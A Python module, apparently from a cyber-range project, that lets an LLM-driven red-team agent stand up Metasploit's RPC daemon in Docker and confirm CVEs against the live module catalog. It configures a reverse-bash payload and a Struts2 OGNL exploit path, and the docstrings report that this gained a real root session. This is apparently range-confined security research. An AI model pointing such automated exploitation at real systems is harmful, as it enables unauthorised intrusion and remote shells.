"""Reusable live-Metasploit layer for the honest engine — red's toolkit, not a CVE list.

Red is a real operator: it fingerprints a service, its LLM reasons out the likely CVE/vector
from that fingerprint (no harness map), CONFIRMS the weapon exists in the LIVE Metasploit
catalog (`confirm_vector` → `search cve:`), and fires it through the gate (`gated_msf_exploit`,
re-exported from swarm.msf) so the pop grounds only on a real session. Nothing here maps a
host/service to an exploit — selection is the live catalog keyed on what red observed.

`standup_msfrpcd` boots a real msfrpcd on the deploy host and connects it to the range's
attacker segment — the segment NAME is DISCOVERED from the attacker container, never
constructed (the range uses docker-assigned project-prefixed net names). Absent Docker/MSF
it logs `msf.unavailable` and returns None, so a caller defers honestly (no fake pop).

Live-proven 2026-10-22: `search cve:2017-5638` → struts2_content_type_ognl; gated fire with
cmd/unix/reverse_bash grounds a real root session. See the project memory for the gotchas
(vulhub internal ports differ; naive keyword search returns noise — CVE-confirm is the path).
"""
import sys
import time
import secrets
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from swarm.gate import run_effect  # noqa: E402  (one effect path)

from swarm.msf import MsfClient, MsfError, gated_msf_exploit  # noqa: E402,F401  (gated re-exported)

MSF_IMAGE = "metasploitframework/metasploit-framework:latest"
RPC_PORT = 55553


def _run(cmd, **kw):
    return run_effect(cmd, capture_output=True, text=True, **kw)


def discover_attacker_net(attacker_container, runner=_run):
    """The range's attacker-segment docker network NAME, read from the attacker container's
    own attachments — never constructed from a project guess. Picks the net whose name
    contains 'attacker'; falls back to the sole non-default net if none match."""
    r = runner(["docker", "inspect", "-f",
                "{{range $k,$v := .NetworkSettings.Networks}}{{$k}} {{end}}", attacker_container],
               timeout=10)
    nets = [n for n in (r.stdout or "").split() if n and n not in ("bridge", "host", "none")]
    pref = [n for n in nets if "attacker" in n]
    return (pref or nets or [None])[0]


# The vetted range images deploy their vulnerable app at a path that differs from the MSF module's
# DEFAULT TARGETURI (which assumes the upstream demo layout, e.g. struts2-showcase). This maps a
# module to the vetted image's ACTUAL app root so a gated fire hits the real endpoint instead of a
# 404 — the same path the out-of-band channel and red's own fingerprint use. Harness ground truth
# about the vetted image (like the service->module map), never red's inference. Live-proven
# 2026-10-28: with TARGETURI=/ (+ the console payload-set fix) struts2_content_type_ognl grounds a
# real root session, where the default /struts2-showcase/ returned 404.
VETTED_TARGETURI = {
    "exploit/multi/http/struts2_content_type_ognl": "/",
}


def targeturi_for(module):
    """The vetted image's app-root TARGETURI for `module`, or None to keep the module default."""
    return VETTED_TARGETURI.get(module)


def confirm_vector(client, cve):
    """Confirm red's researched CVE corresponds to a real weapon in the LIVE catalog.
    Returns [(module, rank), ...] exploit modules, best-first by the caller's own ranking.
    Queries both the full (`cve:CVE-2017-5638`) and numeric (`cve:2017-5638`) forms so it
    matches whichever the backend indexes. Empty => red's hypothesis has no catalog weapon."""
    num = (cve or "").upper().replace("CVE-", "")
    out = []
    for q in (f"cve:{(cve or '').upper()}", f"cve:{num}"):
        try:
            raw = client.search_modules(q)
        except MsfError:
            raw = []
        for r in raw or []:
            m = r.get("module")
            if m and str(m).startswith("exploit/") and not any(m == o[0] for o in out):
                out.append((m, r.get("rank")))
    return out


def standup_msfrpcd(attacker_container, log, *, container_name="ds_msfrpcd", runner=_run,
                    image=MSF_IMAGE, lport=4444, default_payload="cmd/unix/reverse_bash",
                    health_timeout=180):
    """Boot a real msfrpcd and connect it to the range's attacker segment so reverse payloads
    route back. Returns {client, lhost, options, teardown} or None (honest defer). `options`
    carries LHOST (msfrpcd's IP on the attacker net) + LPORT + a default cmd payload the
    caller merges with per-module TARGETURI/TARGET/SSL. `runner` is injectable for tests."""
    net = discover_attacker_net(attacker_container, runner)
    if not net:
        log.append("system", "msf.unavailable", {"reason": "no attacker network discovered",
                   "attacker_container": attacker_container})
        return None
    password = secrets.token_hex(16)

    def _rm():
        runner(["docker", "rm", "-f", container_name], timeout=30)

    _rm()
    start = runner(["docker", "run", "-d", "--rm", "--name", container_name,
                    "-p", f"127.0.0.1:{RPC_PORT}:{RPC_PORT}", image,
                    "./msfrpcd", "-P", password, "-S", "-a", "0.0.0.0", "-p", str(RPC_PORT), "-f"],
                   timeout=120)
    if start.returncode != 0:
        log.append("system", "msf.unavailable", {"reason": "msfrpcd failed to start",
                   "stderr": (start.stderr or "")[:200]})
        return None
    conn = runner(["docker", "network", "connect", net, container_name], timeout=15)
    if conn.returncode != 0:
        log.append("system", "msf.unavailable", {"reason": "could not join attacker net",
                   "net": net, "stderr": (conn.stderr or "")[:200]})
        _rm()
        return None
    insp = runner(["docker", "inspect", "-f",
                   "{{(index .NetworkSettings.Networks \"" + net + "\").IPAddress}}", container_name],
                  timeout=10)
    lhost = (insp.stdout or "").strip() or None
    if not lhost:
        log.append("system", "msf.unavailable", {"reason": "no lhost on attacker net", "net": net})
        _rm()
        return None

    from swarm.msf import Pymetasploit3Backend
    deadline = time.time() + health_timeout
    while time.time() < deadline:
        try:
            backend = Pymetasploit3Backend(host="127.0.0.1", port=RPC_PORT, password=password, ssl=False)
            client = MsfClient(backend)
            client.health_check()
            log.append("system", "msf.wired", {"net": net, "lhost": lhost,
                       "simulated": backend.simulated})
            return {"client": client, "lhost": lhost, "teardown": _rm,
                    "options": {"PAYLOAD": default_payload, "LPORT": lport, "LHOST": lhost, "SSL": False}}
        except MsfError:
            time.sleep(3)
    log.append("system", "msf.unavailable", {"reason": "msfrpcd health never passed"})
    _rm()
    return None


if __name__ == "__main__":  # self-check: confirm_vector + net discovery + honest defer (no Docker)
    from swarm.eventlog import EventLog
    from swarm.msf import FakeMsfBackend
    import tempfile, json as _json

    # confirm_vector against the mock catalog: red's researched CVE -> a real module.
    client = MsfClient(FakeMsfBackend())
    mods = confirm_vector(client, "CVE-2017-5638")
    assert any(m == "exploit/multi/http/struts2_content_type_ognl" for m, _ in mods), mods
    assert confirm_vector(client, "CVE-0000-0000") == [], "an unknown CVE confirms NO weapon"

    # vetted-image TARGETURI override: the struts module's demo-layout default (/struts2-showcase/)
    # 404s on the vetted image, so the gated fire uses the app root; unknown modules keep their default.
    assert targeturi_for("exploit/multi/http/struts2_content_type_ognl") == "/", "struts vetted path"
    assert targeturi_for("exploit/some/other/module") is None, "unknown module keeps its default"

    # attacker-net discovery: picks the 'attacker' net from the container's attachments,
    # never a constructed name; ignores docker defaults.
    def fake_inspect(cmd, **kw):
        class R:  # noqa: D401
            returncode = 0
            stdout = "bridge d2-7_range_attacker d2-7_range_internal "
            stderr = ""
        return R()
    assert discover_attacker_net("range-attacker", fake_inspect) == "d2-7_range_attacker"

    # honest defer: no attacker net discovered -> None + a logged msf.unavailable (no fake pop).
    p = Path(tempfile.mktemp(suffix=".jsonl")); log = EventLog(p)
    def no_net(cmd, **kw):
        class R:
            returncode = 0; stdout = "bridge "; stderr = ""
        return R()
    assert standup_msfrpcd("range-attacker", log, runner=no_net) is None
    ev = [_json.loads(x) for x in p.read_text().splitlines() if x.strip()]
    assert ev and ev[-1]["action"] == "msf.unavailable", ev
    p.unlink(missing_ok=True)

    print("live_msf ok (confirm_vector maps a researched CVE to a live-catalog module and "
          "rejects an unknown one; attacker net is DISCOVERED not constructed; absent Docker "
          "the stand-up defers honestly with a logged msf.unavailable — never a fake pop)")
